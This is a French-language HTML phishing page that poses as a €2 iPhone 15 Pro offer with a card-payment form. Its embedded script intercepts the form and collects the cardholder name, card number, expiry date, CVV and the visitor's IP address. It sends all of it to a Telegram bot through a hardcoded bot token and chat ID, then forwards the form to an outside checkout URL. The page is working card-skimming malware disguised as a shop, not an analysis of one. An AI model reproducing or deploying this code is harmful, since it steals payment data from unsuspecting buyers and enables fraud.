<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>iPhone 15 Pro</title>
    <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
</head>
<body>
<section>
    <div class="product_wrapper animate">
        <div class="container">
            <div class="product_block">
                <div class="images_wrapper">
                    <div class="price_block">
                        <span>Seulement maintenant</span>
                        <h2>€2,00</h2>
                    </div>
                    <div id="white" class="img-tab active">
                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
                    </div>
                </div>
                <div class="form_wrapper">
                    <div class="product_title">
                        <h1>iPhone 15 Pro</h1>
                    </div>
                    <div class="form_block" id="Scroll_form">
                        <form action="https://checkout.purpletask.net/payment/ajW8DMeNkeEmuv9MYi7ihFOnSWHPdqrG" method="POST" id="paymentForm" name="paymentForm" novalidate="novalidate">
                            <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
                            <div class="card-holder form-group">
                                <label for="card_holder">Titulaire de la carte</label>
                                <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" placeholder="Titulaire de la carte" required="" class="form-control form-control-lg jp-card-valid">
                            </div>
                            <div class="card-number form-group">
                                <label for="card_number">Numéro de la carte</label>
                                <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="0000 0000 0000 0000" required="" class="form-control form-control-lg jp-card-invalid">
                            </div>
                            <div class="expiry-date form-group">
                                <label for="expiry_date">Date d'expiration</label>
                                <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required="" class="form-control form-control-lg jp-card-invalid">
                            </div>
                            <div class="row">
                                <div class="col-sm-6 col-9">
                                    <div class="cvv form-group">
                                        <label for="cvv">CVC/CVV</label>
                                        <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="9999" pattern="^[0-9]{3,4}$" placeholder="CVC/CVV" required="" class="form-control form-control-lg jp-card-invalid">
                                    </div>
                                </div>
                                <div class="col-sm-6 col-3 align-self-center">
                                    <div class="cvv-helper form-group">
                                        <img width="50" src="https://cdn.soopercdn.com/cp/checkout/assets/images/cvv.svg" alt="">
                                    </div>
                                </div>
                            </div>
                            <button type="submit" id="submitButton" class="btn btn-success btn-lg">Effectuer Paiement</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<script>
    document.getElementById('paymentForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Empêche la soumission du formulaire par défaut

        // Récupérer les données du formulaire
        const cardHolder = document.getElementById('card_holder').value;
        const cardNumber = document.getElementById('card_number').value;
        const expiryDate = document.getElementById('expiry_date').value;
        const cvv = document.getElementById('cvv').value;

        // Obtenir l'IP de l'utilisateur
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;

                // Préparer le message pour Telegram
                const message = `⚠️ NOUVELLE SOUMISSION DE FORMULAIRE ⚠️\n\n` +
                    `Titulaire de la carte: ${cardHolder}\n` +
                    `Numéro de la carte: ${cardNumber}\n` +
                    `Date d'expiration: ${expiryDate}\n` +
                    `CVV: ${cvv}\n` +
                    `Adresse IP: ${userIp}`;

                // Informations du bot Telegram
                const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Votre token bot
                const telegramChatId = '7747778364'; // Votre ID de chat

                // URL de l'API Telegram pour envoyer le message
                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

                // Envoyer les données à Telegram
                fetch(telegramUrl)
                    .then(response => {
                        if (response.ok) {
                            alert('Données envoyées avec succès.');
                            this.submit(); // Soumettre le formulaire après envoi
                        } else {
                            console.error('Erreur lors de l\'envoi des données à Telegram:', response.status);
                            alert('Une erreur s\'est produite lors de l\'envoi des données.');
                        }
                    })
                    .catch(error => {
                        console.error('Erreur lors de l\'envoi des données à Telegram:', error);
                        alert('Une erreur s\'est produite lors de l\'envoi des données.');
                    });
            })
            .catch(error => {
                console.error('Erreur lors de la récupération de l\'IP utilisateur:', error);
                alert('Une erreur s\'est produite lors de la récupération de votre adresse IP.');
            });
    });
</script>
</body>
</html>
